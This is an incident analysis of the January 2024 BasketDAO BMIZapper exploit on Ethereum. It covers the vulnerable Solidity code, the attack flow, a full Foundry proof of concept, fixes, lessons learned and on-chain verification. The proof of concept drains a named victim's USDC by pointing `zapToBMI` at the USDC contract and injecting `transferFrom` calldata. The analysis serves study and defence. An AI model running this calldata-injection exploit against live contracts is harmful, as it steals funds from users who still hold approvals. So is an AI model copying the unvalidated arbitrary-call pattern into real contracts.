# BasketDAO (BMIZapper) — Unverified User Input Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-17 |
| **Protocol** | BasketDAO (BMIZapper) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$107,000 (114,146 USDC → 44.79 ETH converted) |
| **Attacker** | [0x6313...f8e8](https://etherscan.io/address/0x63136677355840f26c0695dd6de5c9e4f514f8e8) |
| **Attack Contract** | [0xae59...8440](https://etherscan.io/address/0xae5919160a646f5d80d89f7aae35a2ca74738440) |
| **Attack Tx** | [0x9720...c15f6](https://etherscan.io/tx/0x97201900198d0054a2f7a914f5625591feb6a18e7fc6bb4f0c964b967a6c15f6) |
| **Vulnerable Contract** | [0x4622...221b8](https://etherscan.io/address/0x4622aff8e521a444c9301da0efd05f6b482221b8) (BMIZapper) |
| **Attack Block** | [19,029,290](https://etherscan.io/block/19029290) |
| **Root Cause** | `zapToBMI()` function's `_aggregator` address and `_aggregatorData` calldata lack validation — attacker specified the USDC contract as the aggregator and injected `transferFrom` calldata to drain the victim's balance |
| **PoC Source** | [DeFiHackLabs — Bmizapper_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Bmizapper_exp.sol) |
| **Analysis Reference** | [@0xmstore Twitter](https://x.com/0xmstore/status/1747756898172952725) |

---

## 1. Vulnerability Overview

BasketDAO's BMIZapper contract (`0x4622aFF8E521A444C9301dA0efD05f6b482221b8`) provides a convenience function that allows users to swap various stablecoins or derivative tokens into BMI (Basket Market Index) tokens. The `zapToBMI()` function is designed to internally call an external DEX aggregator (such as 1inch) to perform token swaps.

The core issue is that the `zapToBMI()` function performs **no validation whatsoever** on two of its parameters: **`_aggregator` (the target contract address to call)** and **`_aggregatorData` (the call's calldata)**.

An attacker exploited this design flaw by:
1. Specifying any value for the `_from` parameter instead of BUSD (not needed in the attacker's wallet)
2. Specifying the **USDC token contract address** as `_aggregator`
3. Injecting **`transferFrom(victim, attacker, victimBalance)`** calldata as `_aggregatorData`

As a result, BMIZapper used its USDC approval authority to transfer the victim's entire USDC balance (`114,146 USDC`) to the attack contract.

**Key Vulnerability Summary**:

- ❌ Does not verify whether the `_aggregator` address is in an allowlist of permitted DEX aggregators
- ❌ Does not validate whether the function selector in `_aggregatorData` is an allowed swap function
- ❌ When the `_from` token falls under the "bare" token classification, an arbitrary call is executed to `_aggregator`
- ❌ The mere fact that the victim had approved USDC to BMIZapper puts the entire balance at risk

---

## 2. Vulnerable Code Analysis

### 2.1 `zapToBMI()` — Unvalidated Aggregator Parameter Forwarding (Entry Point)

**Severity**: CRITICAL
**CWE**: CWE-20 (Improper Input Validation)

```solidity
// ❌ Vulnerable code — BMIZapper.sol (0x4622aFF8E521A444C9301dA0efD05f6b482221b8)
function zapToBMI(
    address _from,                      // Input token
    uint256 _amount,                    // Input amount
    address _fromUnderlying,            // Underlying token (for Yearn/Compound)
    uint256 _fromUnderlyingAmount,      // Underlying token amount
    uint256 _minBMIRecv,                // Minimum BMI to receive
    address[] memory _bmiConstituents,  // List of BMI constituent tokens
    uint256[] memory _bmiConstituentsWeightings, // Weight of each token
    address _aggregator,                // ❌ Target address for external call — no validation
    bytes memory _aggregatorData,       // ❌ Calldata for external call — no validation
    bool refundDust                     // Whether to refund leftover tokens
) public returns (uint256) {
    // ... weight sum validation ...

    // Transfer tokens to the contract
    IERC20(_from).safeTransferFrom(msg.sender, address(this), _amount);

    // If _from is a "bare" token (DAI, USDC, USDT, etc.), call _primitiveToBMI
    if (_isBare(_from)) {
        // ❌ Forwards _aggregator and _aggregatorData as-is
        _primitiveToBMI(
            _from,
            _amount,
            _bmiConstituents,
            _bmiConstituentsWeightings,
            _aggregator,        // ❌ Attacker specifies the USDC contract
            _aggregatorData     // ❌ Attacker injects transferFrom calldata
        );
    }
    // ...
}
```

### 2.2 `_primitiveToBMI()` — Unvalidated Arbitrary External Call Execution (Core Vulnerability)

```solidity
// ❌ Vulnerable code — BMIZapper._primitiveToBMI()
function _primitiveToBMI(
    address _token,
    uint256 _amount,
    address[] memory _bmiConstituents,
    uint256[] memory _bmiConstituentsWeightings,
    address _aggregator,        // ❌ Address received without validation
    bytes memory _aggregatorData // ❌ Calldata received without validation
) internal {
    // If _token is not DAI, USDC, or USDT, swap to USDC via the aggregator
    if (_token != DAI && _token != USDC && _token != USDT) {

        // ❌ Vulnerability point 1: Uses _aggregator address as the approve target
        IERC20(_token).safeApprove(_aggregator, 0);
        IERC20(_token).safeApprove(_aggregator, _amount);

        // ❌ Vulnerability point 2: Forwards _aggregatorData as-is to any address
        // If attacker sets _aggregator = USDC contract
        //         and _aggregatorData = transferFrom(victim, attacker, amount)
        // then USDC.transferFrom(victim, attacker, amount) is executed
        (bool success, ) = _aggregator.call(_aggregatorData);
        require(success, "!swap");

        // Always move to USDC
        _token = USDC;
    }

    // ... BMI minting logic ...
}
```

#### Vulnerable Code (❌)
```solidity
// Core issue: No validation whatsoever on _aggregator and _aggregatorData
function _primitiveToBMI(
    address _token,
    uint256 _amount,
    address[] memory _bmiConstituents,
    uint256[] memory _bmiConstituentsWeightings,
    address _aggregator,        // ❌ No allowlist check
    bytes memory _aggregatorData // ❌ No function selector check
) internal {
    if (_token != DAI && _token != USDC && _token != USDT) {
        IERC20(_token).safeApprove(_aggregator, 0);
        IERC20(_token).safeApprove(_aggregator, _amount);
        (bool success, ) = _aggregator.call(_aggregatorData); // ❌ Arbitrary external call
        require(success, "!swap");
        _token = USDC;
    }
    // ...
}
```

#### Safe Code (✅)
```solidity
// Fix 1: Aggregator allowlist validation
mapping(address => bool) public allowedAggregators;

// Fix 2: Function selector allowlist validation
bytes4 constant SWAP_SELECTOR = bytes4(keccak256("swap(address,(address,address,address,address,uint256,uint256,uint256),bytes,bytes)"));

function _primitiveToBMI(
    address _token,
    uint256 _amount,
    address[] memory _bmiConstituents,
    uint256[] memory _bmiConstituentsWeightings,
    address _aggregator,
    bytes memory _aggregatorData
) internal {
    if (_token != DAI && _token != USDC && _token != USDT) {
        // ✅ Fix 1: Validate that aggregator is an allowed address
        require(allowedAggregators[_aggregator], "!allowed-aggregator");

        // ✅ Fix 2: Validate function selector in calldata
        bytes4 selector;
        assembly { selector := mload(add(_aggregatorData, 32)) }
        require(selector == SWAP_SELECTOR, "!allowed-selector");

        // ✅ Fix 3: Block calldata containing the transferFrom selector
        require(
            bytes4(_aggregatorData[:4]) != IERC20.transferFrom.selector,
            "!forbidden-selector"
        );

        IERC20(_token).safeApprove(_aggregator, 0);
        IERC20(_token).safeApprove(_aggregator, _amount);
        (bool success, ) = _aggregator.call(_aggregatorData);
        require(success, "!swap");
        _token = USDC;
    }
    // ...
}
```

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attack Flow Overview                          │
│  Attacker EOA: 0x63136677355840F26c0695dD6DE5C9E4f514f8e8       │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 1] Deploy attack contract                                 │
│  Attacker deploys 0xae5919160A646f5D80d89F7aaE35A2CA74738440   │
│  → Query victim balance and prepare attack calldata             │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 2] Attack contract calls BMIZapper.zapToBMI()            │
│  Parameters:                                                     │
│  - _from = BUSD (0x4Fabb...C53)                                  │
│  - _amount = 0                                                   │
│  - _bmiConstituents = [] (empty array)                          │
│  - _aggregator = USDC contract (0xA0b8...eB48)  ← malicious     │
│  - _aggregatorData = transferFrom(victim, attacker, amount) ← injected│
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 3] BMIZapper internal execution                          │
│  _isBare(BUSD) == true, so _primitiveToBMI() is called          │
│  BUSD != DAI && BUSD != USDC && BUSD != USDT condition met      │
│  → Approve BUSD to _aggregator (USDC contract)                  │
│  → Execute USDC.call(_aggregatorData)                           │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 4] USDC.transferFrom() execution                         │
│  msg.sender = BMIZapper (BMIZapper already approved by victim)  │
│  from = victim (0x07d7685bECB1a72a1Cf614b4067419334c9f1b4d)    │
│  to = attack contract (0xae5919160A646...)                       │
│  amount = victim's entire USDC balance = 114,146.25 USDC        │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  [Step 5] USDC → ETH laundering                                 │
│  Attack contract requests swap via Uniswap V2 USDC-ETH pool     │
│  114,146 USDC → 44.79 ETH (~$107,000)                           │
│  → ETH transferred to attacker EOA                              │
└─────────────────────────────────────────────────────────────────┘
```

**Step-by-step description**:

1. **Pre-condition check**: Confirm that the victim (`0x07d7685bECB1a72a1Cf614b4067419334c9f1b4d`) has granted unlimited USDC approval (`allowance = type(uint256).max`) to the BMIZapper contract.

2. **Deploy attack contract**: The attacker deploys the attack contract (`0xae5919160A646f5D80d89F7aaE35A2CA74738440`). This contract queries the victim's balance and constructs the malicious calldata needed for the `zapToBMI` call.

3. **Call `zapToBMI`**: The attack contract calls BMIZapper's `zapToBMI()` function. Key parameters:
   - `_from = BUSD` (BUSD is classified as a "bare" token)
   - `_amount = 0` (the attacker does not need to deposit any actual tokens)
   - `_aggregator = USDC contract address` (0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
   - `_aggregatorData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, attacker, victimBalance)`

4. **Internal call chain**: `zapToBMI` calls `_primitiveToBMI`, and since BUSD != USDC/DAI/USDT, execution enters the aggregator call branch. BMIZapper performs a `call()` to the USDC contract with `_aggregatorData` as the calldata.

5. **`transferFrom` execution**: From the USDC contract's perspective, `msg.sender` is BMIZapper. Because the victim had previously granted BMIZapper permission to spend USDC, `transferFrom(victim, attacker, victimBalance)` succeeds.

6. **Fund laundering**: The stolen 114,146 USDC is swapped for 44.79 ETH (~$107,000) through the Uniswap V2 USDC-WETH pool.

---

## 4. PoC Code Analysis

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    @KeyInfo
    - Total Lost: 114,000 USDC
    - Attacker: https://etherscan.io/address/0x63136677355840f26c0695dd6de5c9e4f514f8e8
    - Attack Contract: https://etherscan.io/address/0xae5919160a646f5d80d89f7aae35a2ca74738440
    - Vuln Contract: https://etherscan.io/address/0x4622aff8e521a444c9301da0efd05f6b482221b8
    - Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x97201900198d0054a2f7a914f5625591feb6a18e7fc6bb4f0c964b967a6c15f6
*/

interface IBMIZapper {
    function zapToBMI(
        address _from,
        uint256 _amount,
        address _fromUnderlying,
        uint256 _fromUnderlyingAmount,
        uint256 _minBMIRecv,
        address[] calldata _bmiConstituents,
        uint256[] calldata _bmiConstituentsWeightings,
        address _aggregator,
        bytes calldata _aggregatorData,
        bool refundDust
    ) external returns (uint256);
}

contract ExploitTest is Test {
    // Vulnerable BMIZapper contract
    IBMIZapper bmiZapper = IBMIZapper(0x4622aFF8E521A444C9301dA0efD05f6b482221b8);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 BUSD = IERC20(0x4Fabb145d64652a948d72533023f6E7A623C7C53);

    // Victim who approved USDC to BMIZapper just before the attack block
    address victim = 0x07d7685bECB1a72a1Cf614b4067419334c9f1b4d;
    address attacker = address(this);  // This contract acts as the attack contract

    function setUp() public {
        // [Step 1] Fork to the block immediately before the attack (19,029,289)
        cheats.createSelectFork("mainnet", 19_029_290 - 1);
    }

    function testExploit() external {
        // [Step 2] Query victim's current USDC balance (114,146 USDC)
        emit log_named_decimal_uint(
            "Victim USDC balance before attack",
            USDC.balanceOf(victim),
            USDC.decimals()
        );

        uint256 victimBalance = USDC.balanceOf(victim);

        // [Step 3] No BMI constituent tokens (empty array)
        address[] memory bmiConstituents = new address[](0);
        uint256[] memory bmiConstituentsWeightings = new uint256[](1);
        bmiConstituentsWeightings[0] = 1e18; // Set 100% weight

        // [Step 4] Core: Construct malicious calldata to execute transferFrom
        // _aggregator = USDC contract address
        // _aggregatorData = USDC.transferFrom(victim, attacker, victimBalance)
        bytes memory maliciousCallData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            victim,     // from: victim address
            attacker,   // to: attacker (this contract)
            victimBalance // amount: victim's entire USDC balance
        );

        // [Step 5] Call zapToBMI — aggregator and calldata are not validated at all
        bmiZapper.zapToBMI(
            address(BUSD),              // _from: BUSD (classified as a bare token)
            0,                          // _amount: 0 (no actual deposit needed)
            address(0),                 // _fromUnderlying: unused
            0,                          // _fromUnderlyingAmount: unused
            0,                          // _minBMIRecv: disable minimum check
            bmiConstituents,            // _bmiConstituents: empty array
            bmiConstituentsWeightings,  // _bmiConstituentsWeightings
            address(USDC),              // _aggregator: ← USDC contract! (malicious)
            maliciousCallData,          // _aggregatorData: ← transferFrom calldata! (injected)
            true                        // refundDust: return leftover
        );

        // [Step 6] Print results — confirm victim USDC drained
        emit log_named_decimal_uint(
            "Victim USDC balance after attack",
            USDC.balanceOf(victim),
            USDC.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker USDC balance",
            USDC.balanceOf(attacker),
            USDC.decimals()
        );
    }
}
```

**Core Attack Mechanism Summary**:

1. Since BMIZapper has `_from = BUSD` and `_amount = 0`, no tokens are actually transferred to the contract. (BUSD.safeTransferFrom(attacker, address(this), 0) → noop)
2. BUSD passes the `_isBare()` check, so execution branches into `_primitiveToBMI`.
3. Since BUSD != DAI && BUSD != USDC && BUSD != USDT, execution enters the aggregator call branch.
4. BMIZapper approves BUSD to `_aggregator` (the USDC contract), then performs `USDC.call(maliciousCallData)` with `_aggregatorData` as the calldata.
5. The USDC contract executes `transferFrom(victim, attacker, victimBalance)`. At this point `msg.sender = BMIZapper`, and since the victim had previously granted BMIZapper approval, the transfer succeeds.

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Severity | Affected Component |
|--------|---------|--------|-------------|
| CWE-20 | Improper Input Validation | CRITICAL | `BMIZapper._primitiveToBMI()` |
| CWE-610 | Externally Controlled Reference | CRITICAL | `_aggregator` parameter |
| CWE-77 | Command Injection — Calldata Injection | HIGH | `_aggregatorData` parameter |
| CWE-284 | Improper Access Control | HIGH | `zapToBMI()` public function |
| CWE-345 | Insufficient Verification of Data Authenticity | MEDIUM | Approval-based trust model |

### V-01: Unvalidated Aggregator Address and Calldata (Core)

- **Description**: The `_primitiveToBMI` function executes the externally supplied `_aggregator` address and `_aggregatorData` calldata without any validation. An attacker can inject an arbitrary contract address and function call data to abuse the BMIZapper contract's privileges.
- **Impact**: Ability to drain the entire token balance of any user who has approved tokens to BMIZapper
- **Attack Conditions**: (1) Victim must have approved an ERC-20 token to BMIZapper, (2) `_from` must fall under the `_isBare()` classification, (3) No flash loan required — completed in a single transaction

### V-02: Externally Controlled Calldata Injection

- **Description**: Arbitrary calldata can be injected into `_aggregatorData` and executed within the `msg.sender` context of BMIZapper. This is a classic "Calldata Injection" or "Arbitrary Call" vulnerability pattern.
- **Impact**: Attacker can arbitrarily use any ERC-20 allowance that BMIZapper holds as `msg.sender`
- **Attack Conditions**: BMIZapper holds an allowance for the target token, or a victim has granted BMIZapper an allowance

### V-03: Abuse of Unlimited Approve Pattern

- **Description**: The victim granting BMIZapper an approval of `type(uint256).max` (unlimited) amplified the damage. This is a common pattern in the DeFi ecosystem, but when the contract contains a vulnerability, it leads to catastrophic losses.
- **Impact**: The victim's entire current balance is drained in a single transaction
- **Attack Conditions**: Victim has granted a broad approval to the vulnerable contract

---

## 6. Reproducibility Assessment

| Item | Assessment |
|------|------|
| Flash loan required | Not required |
| Upfront capital required | Only gas fees (tens of dollars) |
| Attack complexity | Low — completed with a single function call |
| Reproducibility | Very high — PoC is public and verified |
| Likelihood of other victims before patch | High — all addresses that approved BMIZapper are at risk |
| Attack detection difficulty | High — difficult to distinguish from a legitimate `zapToBMI` call |

---

## 7. Remediation

### Immediate Actions

**7.1 Apply Aggregator Allowlist**

```solidity
// ✅ Add allowlist so only permitted aggregators can be used
mapping(address => bool) public allowedAggregators;

// Only owner can permit/revoke aggregators
function setAllowedAggregator(address aggregator, bool allowed) external onlyOwner {
    allowedAggregators[aggregator] = allowed;
    emit AggregatorUpdated(aggregator, allowed);
}

function _primitiveToBMI(
    address _token,
    uint256 _amount,
    address[] memory _bmiConstituents,
    uint256[] memory _bmiConstituentsWeightings,
    address _aggregator,
    bytes memory _aggregatorData
) internal {
    if (_token != DAI && _token != USDC && _token != USDT) {
        // ✅ Allowlist validation
        require(allowedAggregators[_aggregator], "BMIZapper: aggregator not allowed");

        IERC20(_token).safeApprove(_aggregator, 0);
        IERC20(_token).safeApprove(_aggregator, _amount);
        (bool success, ) = _aggregator.call(_aggregatorData);
        require(success, "!swap");
        _token = USDC;
    }
    // ...
}
```

**7.2 Apply Function Selector Blocklist**

```solidity
// ✅ Block dangerous function selectors
function _validateAggregatorData(bytes memory _aggregatorData) internal pure {
    require(_aggregatorData.length >= 4, "!calldata-length");

    bytes4 selector;
    assembly { selector := mload(add(_aggregatorData, 32)) }

    // Block token transfer-related selectors
    require(selector != IERC20.transfer.selector, "!forbidden: transfer");
    require(selector != IERC20.transferFrom.selector, "!forbidden: transferFrom");
    require(selector != IERC20.approve.selector, "!forbidden: approve");
}
```

**7.3 Emergency Contract Pause**

```solidity
// ✅ Minimize damage with pause functionality upon vulnerability discovery
function zapToBMI(...) public whenNotPaused returns (uint256) {
    // ...
}
```

### Long-term Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Unvalidated aggregator | Hardcode DEX aggregator addresses or manage via an on-chain allowlist |
| Calldata injection | Validate the selector in `_aggregatorData` and only allow permitted swap functions |
| Unlimited approve pattern | Provide UI/UX guidance for users to grant only the minimum required allowance |
| External call security | When arbitrary external calls are needed, execute them from a separate isolated contract |
| Security audit | Mandate security review for any changes to key parameters |
| Monitoring | Set up real-time alerts to detect transactions with anomalous patterns (amount=0, empty bmiConstituents array) |

---

## 8. Lessons Learned

1. **Classic "Arbitrary Call" / "Calldata Injection" vulnerability pattern**: This commonly occurs in contracts integrating DEX aggregators or external swap routers. A design where a contract executes a user-specified calldata on a user-specified address turns the contract into an unintended proxy for arbitrary behavior. The same pattern has recurred in the Socket Gateway (2024-01-16, $3.3M), Seneca (2024-02, $6M), Dexible (2023-02, $2M), and Maestro (2023-10, $500K) incidents.

2. **The danger of the approval-based trust model**: When a user grants a contract unlimited approval, any vulnerability in that contract allows an attacker to drain the entire approved balance. Protocols must request only the minimum allowance necessary from users.

3. **Neglecting security of peripheral contracts**: BasketDAO focused on the security of its core contracts (BDI, BMI baskets), but security auditing of peripheral contracts such as Zappers and Burners — which provide convenience functions — was insufficient. Peripheral contracts also directly handle user funds and therefore require the same level of security scrutiny.

4. **The principle of input allowlisting**: When a contract must execute an address or calldata received from external input, it must always define and validate against a pre-approved allowlist of addresses and permitted selectors. The principle to apply is "Trust Nothing," not "Trust but Verify."

5. **The importance of an incident response system**: During the first attack on BasketDAO (2022), an improper response gave the attacker the opportunity to drain funds a second time. The fact that the contract was still active in this 2024 incident shows that sufficient lessons were not drawn from the prior security breach. An immediate contract pause mechanism is essential when a security incident occurs.

6. **Comprehensiveness of security audit scope**: The entire codebase — especially all functions that perform external calls — must be included in security audits. Security audits must never be skipped on the grounds that something is merely a "convenience feature."

---

## 9. On-chain Verification

### 9.1 Transaction Basic Information

| Field | Value |
|------|-----|
| Transaction Hash | `0x97201900198d0054a2f7a914f5625591feb6a18e7fc6bb4f0c964b967a6c15f6` |
| Block Number | 19,029,290 |
| Block Timestamp | `0x65a8471f` = 2024-01-17 (UTC) |
| Attacker (from) | `0x63136677355840F26c0695dD6DE5C9E4f514f8e8` |
| Attack Contract (to) | `0xae5919160A646f5D80d89F7aaE35A2CA74738440` |
| Gas Used | 483,434 |
| Status | Success (status: 1) |

### 9.2 PoC vs On-chain Amount Comparison

| Item | PoC Value | On-chain Actual | Match |
|------|--------|-------------|---------|
| USDC drained | 114,000 USDC (estimated) | 114,146.25 USDC | Approximate match ✅ |
| WETH received | 44.79 ETH (calculated) | 44.7930 ETH | Exact match ✅ |
| USD loss | ~$107,000 | ~$107,070 | Match ✅ |

### 9.3 On-chain Event Log Sequence

| Order | Event | Contract | Description |
|------|-------|---------|------|
| Log[0] | Transfer(attack→BMIZapper, 0) | BUSD | BUSD transfer of 0 (amount=0) |
| Log[1] | Approval(BMIZapper→USDC, 0) | BUSD | BUSD approval reset |
| Log[2] | Approval(BMIZapper→USDC, 0) | BUSD | BUSD approval re-set |
| **Log[3]** | **Transfer(victim→attack, 114,146 USDC)** | **USDC** | **Core: victim USDC drained** |
| Log[4]~[19] | Approval, Transfer (0) | Multiple tokens | BMI constituent token approvals (empty array) |
| Log[20]~[22] | Transfer BMI minting | BMI (0x0AC0) | 0 BMI minted |
| Log[23] | Approval(attack→Uniswap, MAX) | USDC | Prepare USDC → WETH swap |
| **Log[24]** | **Transfer(attack→USDC/ETH Pool, 114,146 USDC)** | **USDC** | **USDC → WETH swap** |
| Log[25] | Transfer(Uniswap→attack, 44.79 WETH) | WETH | WETH received |
| Log[26] | Sync (Uniswap Pool) | USDC-ETH LP | Pool balance updated |
| Log[27] | Swap | Uniswap V2 | Swap completed |
| Log[28] | Withdrawal(attack, 44.79 ETH) | WETH | WETH → ETH unwrap |

### 9.4 Pre-condition Verification (as of attack block 19,029,289)

| Item | Value |
|------|-----|
| Victim USDC balance | 114,146.25 USDC (`0x1a93a581b9` = 114146247609) |
| Victim's BMIZapper USDC allowance | `type(uint256).max` (unlimited) |
| BMIZapper contract state | Active (not paused) |
| Attacker initial balance | 0 USDC, only ETH for gas |

### 9.5 On-chain Verification Result Summary

Analysis of the on-chain logs is in complete agreement with the PoC code analysis. The attack:
- Completed in a single transaction without a flash loan
- Exploited the victim's pre-existing USDC approval
- Executed via the path `zapToBMI` → `_primitiveToBMI` → `USDC.call(transferFrom)`
- Immediately converted the stolen USDC to ETH via Uniswap V2

---

*Reference Sources:*
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Bmizapper_exp.sol)
- [Etherscan Transaction](https://etherscan.io/tx/0x97201900198d0054a2f7a914f5625591feb6a18e7fc6bb4f0c964b967a6c15f6)
- [@0xmstore Analysis](https://x.com/0xmstore/status/1747756898172952725)
- [SlowMist Hacked DB](https://hacked.slowmist.io/?c=ETH)
- [Xangle Incident Report](https://xangle.io/en/insight/events/65a874449e4c14d22b0955ab?date=2024/01/17)